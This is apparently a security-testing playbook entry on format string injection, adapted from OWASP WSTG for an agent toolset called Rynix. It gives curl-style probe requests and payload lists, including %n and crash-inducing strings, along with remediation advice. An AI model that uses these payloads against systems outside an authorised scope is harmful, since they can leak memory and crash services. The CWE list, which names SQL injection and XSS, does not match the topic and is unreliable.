---
id: WSTG-INPV-13
title: Testing for Format String Injection
category: Input Validation
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection
---

# WSTG-INPV-13: Testing for Format String Injection

## Summary

Format String Injection occurs when user-supplied input is used as the format string argument in formatted output functions. This vulnerability primarily affects applications with C/C++ backends (using `printf()`, `sprintf()`, `fprintf()`, `syslog()`, etc.) but can also appear in other languages that support format string operations. When an attacker controls the format string, they can read from and write to arbitrary memory locations, crash the application, or execute arbitrary code. Even in web applications, format string vulnerabilities can exist in backend services, CGI programs, or native extensions.

## Test Objectives

- Identify parameters whose values may be used in format string functions
- Test if format string specifiers are interpreted by the backend
- Determine the potential impact (information disclosure, crash, code execution)
- Detect format string vulnerabilities in both direct and blind contexts

## Prerequisites

- Target application may use C/C++ backends, CGI programs, or native extensions
- Docker pentest container capturing traffic
- Parameters that are logged, displayed, or processed by backend services
- Knowledge that the target may use `printf()`-family functions with user input

## Test Steps

### Step 1: Identify Potential Injection Points

**CLI Actions:**
1. Use `curl` to identify all parameters that are processed by the backend
2. Look for features where user input is:
   - Logged to files or syslog
   - Displayed in error messages
   - Passed to backend services written in C/C++
   - Used in PDF/report generation by native libraries
   - Processed by CGI programs
3. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test with Basic Format Specifiers

**CLI Actions:**
Use `curl` to inject format string specifiers:

**%s specifier (read string from stack):**
```
GET /page?name=%25s HTTP/1.1
Host: target.com
```

**%x specifier (read hex from stack):**
```
GET /page?name=%25x.%25x.%25x.%25x HTTP/1.1
Host: target.com
```

**%p specifier (read pointer from stack):**
```
GET /page?name=%25p.%25p.%25p.%25p HTTP/1.1
Host: target.com
```

Note: `%25` is the URL encoding for `%`. Use `curl --data-urlencode` for proper encoding.

**What to Look For:**
- Hexadecimal values in the response (e.g., `0x7fff5fbff8c8.0x41414141`)
- Memory addresses or stack data
- Application crashes or 500 errors
- Unexpected output replacing the format specifiers

### Step 3: Test for Stack Data Leakage

**CLI Actions:**
Use `curl` to read multiple stack values:

```
GET /page?name=%25x%25x%25x%25x%25x%25x%25x%25x HTTP/1.1
Host: target.com
```

```
GET /page?name=%25p%25p%25p%25p%25p%25p%25p%25p HTTP/1.1
Host: target.com
```

If the response contains hex values or memory addresses, format string processing is confirmed and stack data is being leaked.

### Step 4: Test for Application Crash

**CLI Actions:**
Use `curl` to test if the application crashes (denial of service):

**%n specifier (write to memory - DANGEROUS, may crash):**
```
GET /page?name=%25n HTTP/1.1
Host: target.com
```

**Multiple %s specifiers (read from invalid memory):**
```
GET /page?name=%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s HTTP/1.1
Host: target.com
```

If the application returns a 500 error, connection reset, or becomes unresponsive, it may have crashed due to format string processing.

**CAUTION:** The `%n` specifier writes to memory and can crash the application or cause data corruption. Use with care in production environments.

### Step 5: Test Blind Format String via Time-Based Detection

**CLI Actions:**
If there is no visible output, use `curl` to test with payloads that cause measurable delays:

**Long format string (may cause slow processing):**
```
GET /page?name=%25000000000s HTTP/1.1
Host: target.com
```

**Multiple specifiers (may cause timeout):**
```
GET /page?name=%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s%25s HTTP/1.1
Host: target.com
```

Compare response times against a normal request. Significant delays may indicate format string processing.

### Step 6: Test in Different Contexts

**CLI Actions:**
Format string vulnerabilities can appear in various input vectors. Use `curl` to test:

**POST body parameters:**
```
POST /feedback HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=%25x.%25x.%25x.%25x
```

**HTTP headers (if logged/processed):**
```
GET /page HTTP/1.1
Host: target.com
User-Agent: %x.%x.%x.%x
Referer: %x.%x.%x.%x
```

**JSON parameters:**
```
POST /api/log HTTP/1.1
Host: target.com
Content-Type: application/json

{"message": "%x.%x.%x.%x"}
```

Use `rynix_plugin_run('template-scan')` to check if the template-scan plugin has flagged any format string issues.

## Payloads

### Basic Detection Payloads
```
%s
%x
%p
%d
%n
%25s
%25x
%25p
%25d
%25n
```

### Stack Reading Payloads
```
%x.%x.%x.%x
%p.%p.%p.%p
%08x.%08x.%08x.%08x
%x%x%x%x%x%x%x%x
AAAA%08x.%08x.%08x.%08x
```

### URL-Encoded Payloads
```
%25x.%25x.%25x.%25x
%25p.%25p.%25p.%25p
%2508x.%2508x.%2508x.%2508x
%25s%25s%25s%25s
%25n
```

### Direct Parameter Access Payloads
```
%1$x
%2$x
%3$x
%1$s
%1$p
%1$n
```

### Crash-Inducing Payloads
```
%s%s%s%s%s%s%s%s%s%s
%n%n%n%n%n%n%n%n%n%n
%s%p%x%d%n%s%p%x%d%n
%000000000s
%99999s
```

### Double-Encoded Payloads
```
%2525x
%2525s
%2525p
%2525n
```

### Extended Payloads for Various Contexts
```
${%x%x%x%x}
%x %x %x %x
%%x (%% is literal percent in printf)
%#x (alternate form hex)
%+d (signed integer)
%hn (short write)
```

## Detection Criteria

A finding should be logged when:
- Format specifiers produce hex values, memory addresses, or stack data in the response
- The application crashes or returns 500 errors when format specifiers are sent
- Unexpected output appears in place of the format string input
- Measurable response time differences occur with long format strings
- Error logs contain processed format strings instead of literal input

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Code execution achieved via format string (write primitive) | Critical |
| Stack data or memory contents leaked containing secrets | High |
| Application crash (denial of service) via format string | Medium |
| Format specifiers processed but limited data exposure | Medium |
| Response differences suggest processing but no data leaked | Low |
| Format strings reflected but treated as literal text | Informational |

## Remediation

- Never use user-supplied input as the format string argument
- Always use a static format string: `printf("%s", user_input)` instead of `printf(user_input)`
- Enable compiler warnings for format string issues (`-Wformat`, `-Wformat-security`)
- Use compiler protections: FORTIFY_SOURCE, stack canaries, ASLR
- Apply input validation to reject `%` characters where they are not expected
- Migrate CGI/C backends to memory-safe languages where feasible
- Use static analysis tools (e.g., Flawfinder, Coverity) to detect format string misuse
- If logging user input, always use parameterized logging: `syslog(LOG_INFO, "%s", user_input)`

## References

- [OWASP Testing Guide - Format String Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection)
- [CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html)
- [Format String Exploitation - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

